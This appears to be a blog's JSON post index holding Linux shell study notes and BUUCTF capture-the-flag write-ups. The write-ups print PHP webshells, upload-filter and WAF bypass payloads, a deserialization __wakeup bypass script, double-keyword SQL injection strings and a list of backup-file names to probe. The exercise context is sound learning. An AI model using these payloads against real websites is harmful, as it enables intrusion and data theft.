close;#","categories":[{"name":"CTF","slug":"CTF","permalink":"https://huhu-myh.github.io/categories/CTF/"}],"tags":[{"name":"buu练习","slug":"buu练习","permalink":"https://huhu-myh.github.io/tags/buu%E7%BB%83%E4%B9%A0/"}],"author":"myh"},{"title":"Linux学习-第五章","slug":"Linux学习-第五章","date":"2022-01-25T11:40:34.000Z","updated":"2022-02-08T12:14:41.700Z","comments":true,"path":"posts/myh10011.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10011.html","excerpt":"","text":"五、理解shell5.1 shell 的类型系统启动什么样的shell程序取决于你个人的用户ID配置。在/etc/passwd文件中，在用户ID记录的第7个字段中列出了默认的shell程序。只要用户登录到某个虚拟控制台终端或是在GUI中启动终端仿真器，默认的shell程序就会开始运行。 $ cat /etc/passwd lighthouse:x:1000:1000::/home/lighthouse:/bin/bash bash shell程序位于/bin目录内。从长列表中可以看出/bin/bash（ bash shell）是一个可执行程序： root@VM-16-11-debian:~# ls -lF /bin/bash -rwxr-xr-x 1 root root 1168776 Apr 18 2019 /bin/bash* 默认的交互shell会在用户登录某个虚拟控制台终端或在GUI中运行终端仿真器时启动。不过还有另外一个默认shell是/bin/sh，它作为默认的系统shell，用于那些需要在启动时使用的系统shell脚本。 经常会看到某些发行版使用软链接将默认的系统shell设置成bash shell： root@VM-16-11-debian:~# ls -lF /bin/sh lrwxrwxrwx 1 root root 4 Nov 25 15:30 /bin/sh -&gt; bash* 有些发行版上，默认的系统shell和默认的交互shell并不相同： $ cat /etc/passwd [...] christine:x:1000:1000:Christine,,,:/home/christine:/bin/bash $ $ ls -l /bin/sh lrwxrwxrwx 1 root root 4 Apr 22 12:33 /bin/sh -&gt; dash 5.2 shell 的父子关系用于登录某个虚拟控制器终端或在GUI中运行终端仿真器时所启动的默认的交互shell，是一个父shell。 在CLI提示符后输入/bin/bash命令或其他等效的bash命令时， 会创建一个新的shell程序。这个shell程序被称为子shell（ child shell）。子shell也拥有CLI提示符，同样会等待命令输入。 root@VM-16-11-debian:~# ps -f UID PID PPID C STIME TTY TIME CMD root 8068 8050 0 19:48 pts/0 00:00:00 -bash root 12611 8068 0 20:06 pts/0 00:00:00 ps -f root@VM-16-11-debian:~# bash //创建子shell root@VM-16-11-debian:~# bash //子shell中创建子shell root@VM-16-11-debian:~# bash root@VM-16-11-debian:~# ps --forest PID TTY TIME CMD 8068 pts/0 00:00:00 bash 14850 pts/0 00:00:00 \\_ bash 14858 pts/0 00:00:00 \\_ bash 14861 pts/0 00:00:00 \\_ bash 14994 pts/0 00:00:00 \\_ ps root@VM-16-11-debian:~# exit exit //exit退出shell root@VM-16-11-debian:~# exit exit root@VM-16-11-debian:~# exit exit root@VM-16-11-debian:~# ps -f UID PID PPID C STIME TTY TIME CMD root 8068 8050 0 19:48 pts/0 00:00:00 -bash root 15204 8068 0 20:17 pts/0 00:00:00 ps -f 输入命令bash之后，一个子shell就出现了。第二个ps -f是在子shell中执行的。可以从显示结果中看到有两个bash shell程序在运行。第一个bash shell程序，也就是父shell进程，其原始进程ID是1814。第二个bash shell程序， 即子shell进程，其PID是2430。注意，子shell的父进程ID（ PPID）是1841，指明了这个父shell进程就是该子shell的父进程。 5.2.1 进程列表命令之间加入分号（ ;）可以依次运行的一系列命令。 root@VM-16-11-debian:~# pwd ; ls ; cd /etc ; pwd /root disk.sh install.sh mc /etc 不过这并不是进程列表。命令列表要想成为进程列表，这些命令必须包含在括号里。 root@VM-16-11-debian:~#(pwd ; ls ; cd /etc ; pwd ) /root disk.sh install.sh mc /etc 虽然结果没有不同但是括号的加入使命令列表变成了进程列表，生成了一个子shell来执行对应的命令。 要想知道是否生成了子shell，得借助一个使用了环境变量的命令。（环境变量会在第6章中详述。）这个命令就是echo $BASH_SUBSHELL。如果该命令返回0，就表明没有子shell。如果返回1或者其他更大的数字，就表明存在子shell。 root@VM-16-11-debian:~# (pwd ; ls ; cd /etc ; pwd; echo $BASH_SUBSHELL) /root disk.sh install.sh mc /etc 1 #嵌套 $ ( pwd ; (echo $BASH_SUBSHELL)) /home/Christine 2 在shell脚本中，经常使用子shell进行多进程处理。但是采用子shell的成本不菲，会明显拖慢处理速度。在交互式的CLI shell会话中，子shell同样存在问题。它并非真正的多进程处理，因为终端控制着子shell的I/O。 5.3 理解 shell 的内建命令5.3.1 外部命令 (非内建命令)外部命令，有时候也被称为文件系统命令，是存在于bash shell之外的程序。它们并不是shell程序的一部分。外部命令程序通常位于/bin、 /usr/bin、 /sbin或/usr/sbin中。ps就是一个外部命令。你可以使用which和type命令找到它。 root@VM-16-11-debian:~# which ps /usr/bin/ps 当外部命令执行时，会创建出一个子进程。这种操作被称为衍生（ forking）。外部命令ps很方便显示出它的父进程以及自己所对应的衍生子进程。 root@VM-16-11-debian:~# ps -f UID PID PPID C STIME TTY TIME CMD root 10004 9998 0 15:09 pts/1 00:00:00 -bash root 11078 10004 0 15:13 pts/1 00:00:00 ps -f 5.3.2 内建命令内建命令和外部命令的区别在于前者不需要使用子进程来执行。它们已经和shell编译成了一体，作为shell工具的组成部分存在。不需要借助外部程序文件来运行。 cd和exit命令都内建于bash shell。可以利用type命令来了解某个命令是否是内建的。 root@VM-16-11-debian:~# type cd cd is a shell builtin root@VM-16-11-debian:~# type exit exit is a shell builtin 有些命令有多种实现。例如echo和pwd既有内建命令也有外部命令。两种实现略有不同。要查看命令的不同实现，使用type命令的-a选项。 $ type -a echo echo is a shell builtin echo is /bin/echo $ $ which echo /bin/echo $ $ type -a pwd pwd is a shell builtin pwd is /bin/pwd $ $ which pwd /bin/pwd which命令只显示出了外部命令文件。 5.3.2.1 使用history命令一个有用的内建命令是history命令。 bash shell会跟踪你用过的命令。你可以唤回这些命令并重新使用。 查看最近用过的命令列表，可以输入不带选项的history命令： $ history 1 ps -f 2 pwd 3 ls 4 coproc ( sleep 10; sleep 2 ) 5 jobs 6 ps --forest 7 ls 8 ps -f 9 pwd 通常历史记录中会保存最近的1000条命令。 不同的系统配置可能不一样，可以通过HISTSIZE环境变量查看： root@VM-16-11-debian:~# echo $HISTSIZE 3000 输入!!，然后按回车键就能够唤出刚刚用过的那条命令来使用: root@VM-16-11-debian:~# ps PID TTY TIME CMD 17661 pts/2 00:00:00 bash 18051 pts/2 00:00:00 ps root@VM-16-11-debian:~# !! ps PID TTY TIME CMD 17661 pts/2 00:00:00 bash 18063 pts/2 00:00:00 ps 当输入!!时， bash首先会显示出从shell的历史记录中唤回的命令。然后执行该命令。 命令历史记录被保存在隐藏文件.bash_history中，它位于用户的主目录中。这里要注意的是，bash命令的历史记录是先存放在内存中，当shell退出时才被写入到历史文件中。 $ history [...] 25 ps --forest 26 history 27 ps --forest 28 history $ $ cat .bash_history pwd ls history exit 可以唤回历史列表中任意一条命令。只需输入感叹号（!）和命令在历史列表中的编号即可。 $ history [...] 16 type pwd 17 which pwd 18 type echo 19 which echo 20 type -a pwd 21 type -a echo [...] 32 history -a 33 history $ !20 type -a pwd pwd is a shell builtin pwd is /bin/pwd 文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)","categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"Linux学习-第四章","slug":"Linux学习-第四章","date":"2022-01-22T08:37:01.000Z","updated":"2022-02-07T01:19:52.777Z","comments":true,"path":"posts/myh10010.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10010.html","excerpt":"","text":"第四章：进阶bash shell命令4.1 监测程序4.1.1 探查进程在讲探查进程之前先说明一下什么是进程。进程：运行在系统上的程序。要监测这些进程，需要熟悉ps命令的用法。 ps命令好比工具中的瑞士军刀，它能输出运行在系统上的所有程序的许多信息。 root@VM-16-11-debian:~# ps PID TTY TIME CMD 26084 pts/0 00:00:00 bash 26098 pts/0 00:00:00 ps #PID : Process ID,显示了当前程序的进程ID #TTY : 属于哪个终端 #TIME: 运行的时长 默认情况下， ps命令只会显示运行在当前控制台下的属于当前用户的进程。 此例我们只运行了bash shell（注意， shell也只是运行在系统上的另一个程序而已）以及ps命令本身。 下面讲解一下ps命令对应的部分参数及其作用: 参数 描述 -A 显示所有进程 -N 显示与指定参数不符的所有进程 -a 显示除控制进程（ session leader）和无终端进程外的所有进程 -d 显示除控制进程外的所有进程 -e 显示所有进程 -c 显示进程的额外调度器信息 -f 显示完整格式的输出 -l 显示长列表 命令参数还有很多，也不需要都记住，只需要记住最常用的就好。经常把参数组合起来用是不错的方法，比如-ef命令，可以查看系统上运行的所有进程并且显示一些经常需要的信息： root@VM-16-11-debian:~# ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 Jan21 ? 00:00:02 /sbin/init root 2 0 0 Jan21 ? 00:00:00 [kthreadd] root 3 2 0 Jan21 ? 00:00:00 [rcu_gp] root 4 2 0 Jan21 ? 00:00:00 [rcu_par_gp] root 6 2 0 Jan21 ? 00:00:00 [kworker/0:0H-kblockd] root 7 2 0 Jan21 ? 00:00:00 [kworker/u4:0-events_unbound] root 8 2 0 Jan21 ? 00:00:00 [mm_percpu_wq] root 9 2 0 Jan21 ? 00:00:01 [ksoftirqd/0] root 10 2 0 Jan21 ? 00:00:29 [rcu_sched] root 11 2 0 Jan21 ? 00:00:00 [rcu_bh] …… UID：启动这些进程的用户。 PID：进程的进程ID。 PPID：父进程的进程号（如果该进程是由另一个进程启动的）。 C：进程生命周期中的CPU利用率。 STIME：进程启动时的系统时间。 TTY：进程启动时的终端设备。 TIME：运行进程需要的累计CPU时间。 CMD：启动的程序名称 如果需要更多信息使用-l参数，也可以结合使用： root@VM-16-11-debian:~# ps -le F S UID PID PPID C PRI NI ADDR SZ WCHAN TTY TIME CMD 4 S 0 1 0 0 80 0 - 26326 do_epo ? 00:00:02 systemd 1 S 0 2 0 0 80 0 - 0 - ? 00:00:00 kthreadd 1 I 0 3 2 0 60 -20 - 0 - ? 00:00:00 rcu_gp 1 I 0 4 2 0 60 -20 - 0 - ? 00:00:00 rcu_par_gp 1 I 0 6 2 0 60 -20 - 0 - ? 00:00:00 kworker/0:0H-kblockd 1 I 0 7 2 0 80 0 - 0 - ? 00:00:00 kworker/u4:0-events_unbound 1 I 0 8 2 0 60 -20 - 0 - ? 00:00:00 mm_percpu_wq 1 S 0 9 2 0 80 0 - 0 - ? 00:00:01 ksoftirqd/0 1 I 0 10 2 0 80 0 - 0 - ? 00:00:29 rcu_sched F：内核分配给进程的系统标记。 S：进程的状态（ O代表正在运行； S代表在休眠； R代表可运行，正等待运行； Z代表僵化，进程已结束但父进程已不存在； T代表停止）。 PRI：进程的优先级（越大的数字代表越低的优先级）。 NI：谦让度值用来参与决定优先级。 ADDR：进程的内存地址。 SZ：假如进程被换出，所需交换空间的大致大小。 WCHAN：进程休眠的内核函数的地址。 4.1.2 实时探测进程ps命令虽然在收集运行在系统上的进程信息时非常有用，但也有不足之处：它只能显示某个特定时间 。如果想观察那些频繁换进换出的内存的进程趋势，用ps命令就不方便了。 top命令刚好适用这种情况。 top命令跟ps命令相似，能够显示进程信息，但它是实时显的。 输出的第一部分显示的是系统的概况：第一行显示了当前时间、系统的运行时间、登录的用户数以及系统的平均负载。平均负载有3个值：最近1分钟的、最近5分钟的和最近15分钟的平均负载。值越大说明系统的负载越高。由于进程短期的突发性活动，出现最近1分钟的高负载值也很常见，但如果近15分钟内的平均负载都很高，就说明系统可能有问题。 说明:Linux系统管理的要点在于定义究竟到什么程度才算是高负载。这个值取决于系统的硬件配置以及系统上通常运行的程序。对某个系统来说是高负载的值可能对另一系统来说就是正常值。通常，如果系统的负载值超过了2，就说明系统比较繁忙了。 第二行显示了进程概要信息——top命令的输出中将进程叫作任务（ task）：有多少进程处在运行、休眠、停止或是僵化状态（僵化状态是指进程完成了，但父进程没有响应）。 第三行显示了CPU的概要信息。 top根据进程的属主（用户还是系统）和进程的状态（运行、空闲还是等待）将CPU利用率分成几类输出。 紧跟其后的两行说明了系统内存的状态。第一行说的是系统的物理内存：总共有多少内存，当前用了多少，还有多少空闲。后一行说的是同样的信息，不过是针对系统交换空间（如果分配了的话）的状态而言的。 后一部分显示了当前运行中的进程的详细列表，有些列跟ps命令的输出类似： PID：进程的ID。 USER：进程属主的名字。 PR：进程的优先级。 NI：进程的谦让度值。 VIRT：进程占用的虚拟内存总量。 RES：进程占用的物理内存总量。 SHR：进程和其他进程共享的内存总量。 S：进程的状态（ D代表可中断的休眠状态， R代表在运行状态， S代表休眠状态， T代表跟踪状态或停止状态， Z代表僵化状态，I代表空闲的任务（进程），这是比较新版的内核中新增的状态。） %CPU：进程使用的CPU时间比例。 %MEM：进程使用的内存占可用内存的比例。 TIME+：自进程启动到目前为止的CPU时间总量。 COMMAND：进程所对应的命令行名称，也就是启动的程序名。 在top命令运行时键入可改变top的行为。键入f允许你选择对输出进行排序的字段，键入d允许你修改轮询间隔。键入q可以退出top。 4.1.3 结束进程有时进程挂起了，只需要动动手让进程重新运行或结束就行了。但有时，有的进程会耗尽CPU且不释放资源。在这两种情景下，你就需要能控制进程的命令。 Linux沿用了Unix进行进程间通信的方法。 在Linux中，进程之间通过信号来通信。进程的信号就是预定义好的一个消息，进程能识别它并决定忽略还是作出反应。进程如何处理信号是由开发人员通过编程来决定的。大多数编写完善的程序都能接收和处理标准Unix进程信号。 信号 名称 描述 1 HUP 挂起 2 INT 中断 3 QUIT 结束运行 9 KILL 无条件终止 11 SEGV 段错误 15 TERM 尽可能终止 17 STOP 无条件停止运行，但不终止 18 TSTP 停止或暂停，但继续在后台运行 19 CONT 在STOP或TSTP之后恢复执行 kill命令 ： 要发送进程信号，你必须是进程的属主或登录为root用户。 kill命令可通过进程ID（ PID）给进程发信号。默认情况下， kill命令会向命令行中列出的全部PID发送一个TERM信号。遗憾的是，你只能用进程的PID而不能用命令名，所以kill命令有时并不好用。 $ kill 3940 -bash: kill: (3940) - Operation not permitted $ TERM信号告诉进程可能的话就停止运行。不过，如果有不服管教的进程，那它通常会忽略这个请求。如果要强制终止， -s参数支持指定其他信号（用信号名或信号值）。 # kill -s HUP 3940 # 可以看出kill命令不会有任何输出。 要检查kill命令是否有效，可再运行ps或top命令，看看问题进程是否已停止。 killall命令： killall命令支持通过进程名而不是PID来结束进程。 killall命令也支持通配符，这在系统因负载过大而变得很慢时很有用。 警告 以root用户身份登录系统时，使用killall命令要特别小心，因为很容易就会误用通配符而结束了重要的系统进程。这可能会破坏文件系统。 4.2 监测磁盘空间4.2.1 df 命令df命令可以方便地查看所有已挂载磁盘的使用情况。 $ df Filesystem 1K-blocks Used Available Use% Mounted on udev 1939124 0 1939124 0% /dev tmpfs 391044 39556 351488 11% /run /dev/vda1 82503044 5996440 73051148 8% / tmpfs 1955208 32 1955176 1% /dev/shm 设备的设备文件位置； 能容纳多少个1024字节大小的块； 已用了多少个1024字节大小的块； 还有多少个1024字节大小的块可用； 已用空间所占的比例； 设备挂载到了哪个挂载点上 一个常用的参数是-h。它会把输出中的磁盘空间按照用户易读的形式显示，通常用M来替代兆字节，用G替代吉字节。 $ df -h Filesystem Size Used Avail Use% Mounted on udev 1.9G 0 1.9G 0% /dev tmpfs 382M 39M 344M 11% /run /dev/vda1 79G 5.8G 70G 8% / tmpfs 1.9G 32K 1.9G 1% /dev/shm 4.2.2 du命令du命令可以显示某个特定目录（默认情况下是当前目录）的磁盘使用情况。这一方法可用来快速判断系统上某个目录下是不是有超大文件。 默认情况下， du命令会显示当前目录下所有的文件、目录和子目录的磁盘使用情况，它会以磁盘块为单位来表明每个文件或目录占用了多大存储空间。 $ du 484 ./.gstreamer-0.10 8 ./Templates 8 ./Download 8 ./.ccache/7/0 24 ./.ccache/7 368 ./.ccache/a/d 384 ./.ccache/a 424 ./.ccache 每行输出左边的数值是每个文件或目录占用的磁盘块数。列表是从目录层级的最底部开始，然后按文件、子目录、目录逐级向上。 同理，也有-h参数按用户易读的格式输出大小 。 4.3 处理数据文件4.3.1 排序数据sort命令按照会话指定的默认语言的排序规则对文本文件中的数据行排序。 $ cat file1 one two three four five $ sort file1 five four one three two 但是如果对数字进行排序，可能会出点差错： $ cat file2 1 2 100 45 3 10 145 $ sort file2 1 10 100 145 2 3 45 默认情况下， sort命令会把数字当做字符来执行标准的字符排序。解决这个问题可用-n参数 ，告诉sort命令把数字识别成数字而不是字符，并且按值排序 。 $ sort -n file2 1 2 3 10 45 100 145 另一个常用的参数是-M，按月排序。 Linux的日志文件经常会在每行的起始位置有一个时间戳，用来表明事件是什么时候发生的。如果用-M参数， sort命令就能识别三字符的月份名，并相应地排序。 Sep 13 07:10:09 testbox smartd[2718]: Device: /dev/sda, opened #日志文件 $ sort -M file3 Jan Feb Mar Apr 常用参数： 参数 描 述 -f 参数会忽略大小写 -r 反序排序（升序变成降序） -t 指定一个用来区分键位置的字符 -n 按字符串数值来排序（并不转换为浮点数） -g 按通用数值来排序（跟-n不同，把值当浮点数来排序，支持科学 计数法表示的值） -k和-t参数在对按字段分隔的数据进行排序时非常有用，例如/etc/passwd文件。可以用-t参数来指定字段分隔符，然后用-k参数来指定排序的字段。举个例子，要对前面提到的密码文件/etc/passwd根据用户ID进行数值排序，可以这么做： $ sort -t ':' -k 3 -n /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync 此时数据已经按第三个字段——用户ID的数值排序。 4.3.2 搜索数据格式：grep [options] pattern [file] grep命令会在输入或指定的文件中查找包含匹配指定模式的字符的行。 grep的输出就是包含了匹配模式的行（并不是行号是一行内容）。 root@VM-16-11-debian:/tmp/test# cat test1.txt teacher zhao Teacher wang student li Student qin teach him sovle it root@VM-16-11-debian:/tmp/test# grep teacher test1.txt teacher zhao root@VM-16-11-debian:/tmp/test# grep t test1.txt teacher zhao student li Student qin teach him sovle it -v参数：进行反向搜索（输出不匹配该模式的行） 。 root@VM-16-11-debian:/tmp/test# grep -v t test1.txt Teacher wang -n参数：显示匹配模式的行所在的行号 。 root@VM-16-11-debian:/tmp/test# grep -n t test1.txt 1:teacher zhao 3:student li 4:Student qin 5:teach him 6:sovle it -c参数：显示多少行含有匹配的模式 。 root@VM-16-11-debian:/tmp/test# grep -c t test1.txt 5 -e 参数：指定多个匹配模式 。 root@VM-16-11-debian:/tmp/test# grep -e t -e a test1.txt teacher zhao Teacher wang student li Student qin teach him sovle it 通用的可以使用通配符、正则表达式来匹配~ 4.3.3 压缩数据$ gzip myprog $ ls -l my* -rwxrwxr-x 1 rich rich 2197 2007-09-13 11:29 myprog.gz gzip命令会压缩你在命令行指定的文件。也可以在命令行指定多个文件名甚至用通配符来一次性批量压缩文件。 $ gzip my* $ ls -l my* -rwxr--r-- 1 rich rich 103 Sep 6 13:43 myprog.c.gz -rwxr-xr-x 1 rich rich 5178 Sep 6 13:43 myprog.gz -rwxr--r-- 1 rich rich 59 Sep 6 13:46 myscript.gz -rwxr--r-- 1 rich rich 60 Sep 6 13:44 myscript2.gz $ 4.3.4 归档数据虽然zip命令能够很好地将数据压缩和归档进单个文件，但它不是Unix和Linux中的标准归档工具。目前， Unix和Linux上最广泛使用的归档工具是tar命令。 tar命令的格式： tar function [options] object1 object2 ... function参数定义了tar命令应该做什么 : 功 能 长名称 描述 -A –concatenate 将一个已有tar归档文件追加到另一个已有tar归档文件 -c –create 创建一个新的tar归档文件 -d –diff 检查归档文件和文件系统的不同之处 –delete 从已有tar归档文件中删除 -r –append 追加文件到已有tar归档文件末尾 -t –list 列出已有tar归档文件的内容 -u –update 将比tar归档文件中已有的同名文件新的文件追加到该tar归档文件中 -x –extract 从已有tar归档文件中提取文件 每个功能可用选项来针对tar归档文件定义一个特定行为。下表列出了这些选项中能和tar命令一起使用的常见选项🤪。 选 项 描 述 -C dir 切换到指定目录 -f file 输出结果到文件或设备file -j 将输出重定向给bzip2命令来压缩内容 -p 保留所有文件权限 -v 在处理文件时显示文件 -z 将输出重定向给gzip命令来压缩内容 这些选项经常合并到一起使用。首先，你可以用下列命令来创建一个归档文件： tar -cvf test.tar test/ test2/ 上面的命令创建了名为test.tar的归档文件，含有test和test2目录内容。接着，用下列命令： tar -tf test.tar 列出tar文件test.tar的内容（但并不提取文件）。最后，用命令： tar -xvf test.tar 通过这一命令从tar文件test.tar中提取内容。如果tar文件是从一个目录结构创建的，那整个目录结构都会在当前目录下重新创建。 窍门 下载了开源软件之后，你会经常看到文件名以.tgz结尾。这些是gzip压缩过的tar文件可以用命令tar -zxvf filename.tgz来解压。 文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)","categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"ASC学习","slug":"MPI学习","date":"2022-01-22T07:15:38.000Z","updated":"2022-01-25T08:27:04.694Z","comments":true,"path":"posts/myh10009.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10009.html","excerpt":"","text":"一、MPI本次学习基于：https://mpitutorial.com/tutorials/ ，MPI教程。 https://zhuanlan.zhihu.com/p/355652501 二、make学习https://www.ruanyifeng.com/blog/2015/02/make.html 三、cmake学习https://www.hahack.com/codes/cmake/ 四、机器学习视频：https://www.bilibili.com/video/BV164411b7dx?from=search&amp;seid=13050048519173094800&amp;spm_id_from=333.337.0.0 ​ https://www.coursera.org/learn/machine-learning/home/welcome 笔记：http://www.ai-start.com/ml2014/ 五、Pytorch学习wiki：https://handbook.pytorch.wiki/ 动态学习，一点一点补~","categories":[{"name":"ASC","slug":"ASC","permalink":"https://huhu-myh.github.io/categories/ASC/"}],"tags":[{"name":"MPI","slug":"MPI","permalink":"https://huhu-myh.github.io/tags/MPI/"}],"author":"myh"},{"title":"buuctf练习[11-20]","slug":"buuctf练习-11-20","date":"2022-01-19T07:07:24.000Z","updated":"2022-02-05T01:44:56.921Z","comments":true,"path":"posts/myh10008.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10008.html","excerpt":"","text":"11.[极客大挑战 2019]Knife题目都告诉了是白给的shell，直接连就好了拿到webshell，找到根目录下有个flag，读取拿到flag: 12.[极客大挑战 2019]Http考察的主要是http头部的一些信息，按着改就行了。首先那道题进入网页看到源码里面隐藏一个：Secret.php，进入后看到提示信息： It doesn’t come from ‘https://Sycsecret.buuoj.cn'，直接抓包改： 加个Referer: https://Sycsecret.buuoj.cn， 看到又说必须使用”syclover browser”,接着改User-Agent 这又说必须本地访问，再改X-Forwarded-For拿到flag: 这里讲一下这三个参数： Referer: 浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL(你从哪来的)。 User-Agent: 浏览器表明自己的身份（是哪种浏览器）。 X-Forwarded-For: 表示 HTTP 请求端真实 IP。 13.[极客大挑战 2019]Upload好久没做文件上传的题了，有点难到我了。 首先上传一个一句话木马试试： &lt;?php eval($_POST['shell'])?&gt; 显示：NOT IMAGE，那就抓包先改COntent-Type:image/jpeg: 接着说不能是php，绕过后缀的有文件格式有php,php3,php4,php5,phtml，phtm，前几个试试都不行，那就试试phtml： 接着是不能含有’&lt;?’ ，那就再改，查到了一个payload: &lt;script language=\"php\"&gt;eval($_REQUEST[shell])&lt;/script&gt; 接着说不是图片，那就是检查了头部信息，加特征信息，成功上传： GIF89a? &lt;script language=\"php\"&gt;eval($_REQUEST[1])&lt;/script&gt; 最后在连的时候要猜一下文件上传到哪里了！常规的目录/upload下面，然后直接连 /upload/2.phtml 就可以了 蚁剑连一下flag就在根目录，拿到flag:flag{07b9cce3-4089-4384-a26a-4572c9c90566}。 总体思路大概就是先上传个马，看返回信息，然后对应改就可以了，还有很多过滤，以后慢慢遇见~ 这里推荐一篇博客，讲解了一句话木马的原理：https://blog.csdn.net/weixin_39190897/article/details/86772765 14.[ACTF2020 新生赛]Upload这题和上题差不多，多了一个前端验证，所以可以先制作一个图片木马上传抓包，然后改文件后缀为：phtml，成功上传，然后就可以直接连了拿到webshell： 拿到flag：flag{7facc008-0a13-457f-9a24-3f63516cd0c8} 15.[RoarCTF 2019]Easy Calc这题难道我了，首先题目考察的是命令执行。但是设置了WAF和一些字符过滤，里面涉及了挺多不知道的知识点。首先访问页面是一个输入框，看页面源码看到提示设置了WAF来阻止你的一些输入，还可以看到一个calc.php，看到里面也有一些匹配限制。注意一下，这个WAF不仅仅是这个php还有你看不到的，就比如先输入calc.php?num=a，可以看到返回403，因为这里过滤了字母你只能是数字。所以这里运用到了php字符串解析特性： 我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过： /news.php?%20news[id%00=42\"+AND+1=0-- 在解析查询字符串时，它会做两件事： ​ 1.删除空白符 ​ 2.将某些字符转换为下划线（包括空格） 具体可以参考这篇文章：https://www.freebuf.com/articles/web/213359.html 所以接下来我们可以构造payload: /calc.php? num=a，可以发现此时页面能够回显ａ，这里在num前面加了空格，WAF检测的是num，但是我们输入的是‘ num’，所以就绕过了WAF，但是PHP在解析的时候会删除空白字符，就会存储为Array([num] =&gt; “ａ”)，同时实现了给num赋非数字值。这样就过了第一关。 下一个是绕过正则匹配了，有两种方法： 使用chr()绕过，将ascii码转成单个字符串在用.拼接。 使用字符取反绕过，如~%9e就代表字符串a。 这里/=chr(47) ?%20num=var_dump(scandir(chr(47))) // 列出根目录下的全部文件名 ?%20num=var_dump(file_get_contents(~%D0%99%CE%9E%98%98)) // 读flag文件 这里的取反就是将二进制0变为1，1变为0，具体实现就如： 所以我们在读的时候再取反一次就是等价于读f1agg。 还有一些绕过技巧见：https://www.hetianlab.com/specialized/20201124173456 这里还有另外一种方法HTTP走私，具体可见： https://paper.seebug.org/1048/ https://baijiahao.baidu.com/s?id=1715478145881946407&amp;wfr=spider&amp;for=pc 16.[极客大挑战 2019]PHP打开题目是可爱的猫猫，先逗会猫在做题哈哈……题目提示有文件备份，那就直接开扫，遇见别用了好拉扫不到，用dirsearch扫到www.zip，直接访问下载到源码，看到flag.php，哦~假的:狗头:，那就分析源码： index.php &lt;?php include 'class.php'; $select = $_GET['select']; $res=unserialize(@$select); ?&gt; 注意看到index.php里有参数传入，并且有反序列化，再看class.php: &lt;?php include 'flag.php'; error_reporting(0); class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } function __wakeup(){ $this-&gt;username = 'guest'; } function __destruct(){ if ($this-&gt;password != 100) { echo \"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\"; echo \"You name is: \"; echo $this-&gt;username;echo \"&lt;/br&gt;\"; echo \"You password is: \"; echo $this-&gt;password;echo \"&lt;/br&gt;\"; die(); } if ($this-&gt;username === 'admin') { global $flag; echo $flag; }else{ echo \"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\"; die(); } } } ?&gt; 总的读下来要想拿到flag，就得让password=100,username=admin,可以看到直接反序列化肯定不行，这里有__wakeup函数，所以要绕过，绕过技巧就是让序列化后的属性值大于原本的属性值个数，具体构造代码如下： &lt;?php class Name{ private $username; private $password; public function __construct(){ $this-&gt;username = \"admin\"; $this-&gt;password = \"100\"; } } $a = serialize(new Name()); $a = str_replace(':2:',':3:',$a); //绕过__wakeup echo urlencode($a); //O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D ?&gt; 直接传参得到 flag{bf2e4c0e-baf2-4f7f-81a1-0c4857a3366c} 17.[极客大挑战 2019]BabySQL这个SQL注入相比较之前的就是多了过滤设置，而且这里主要考察的双写绕过，其中做题容易忽略的一点就是前面过滤的后面给忘了hh: 1.判断注入点，再密码位置输入1'，发现报错，说明存在SQL注入。 2.接着判断字段数，使用order by 8 # ，发现报错： 看到or和by没了，说明被过滤了，拿过滤什么就双写什么改为：oorrder bbyy 4 #，接着改为3就对了说明是三段。 3.看回显哪部分: union select 1,2,3： 看到union,select也被过滤了，再改：1' ununionion selselectect 1,2,3 # : 4.接下来就是正常步骤了，查库名：1' ununionion seselectlect 1,database(),3 #得到使用的是geek，那就先接着查 5.查表名1' ununionion seselectlect 1,(seselectlect group_concat(table_name) from information_schema.tables where table_schema='geek'),3 #,最坑的来了： 发现where和.tables前面的没了，这里记得information里面有or!!!，给过滤了，同时之后看到from也给过滤了，所以修改之后为： 1' ununionion seselectlect 1,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='geek'),3 #，就得到表名了，之后就没啥新的过滤了，最后得到flag。 18.[ACTF2020 新生赛]BackupFile这题考查的主要是源码泄露以及弱类型比较。 网站备份压缩文件：管理员将网站源代码备份在Web目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。常见的备份文件后缀： .index.php.swp index.php.swp index.php.bak //本题提示的bak备份文件 .index.php~ index.php.bak_Edietplus index.php.~ index.php.~1~ index.php index.php~ index.php.rar index.php.zip index.php.7z index.php.tar.gz www.zip www.rar www.zip www.7z 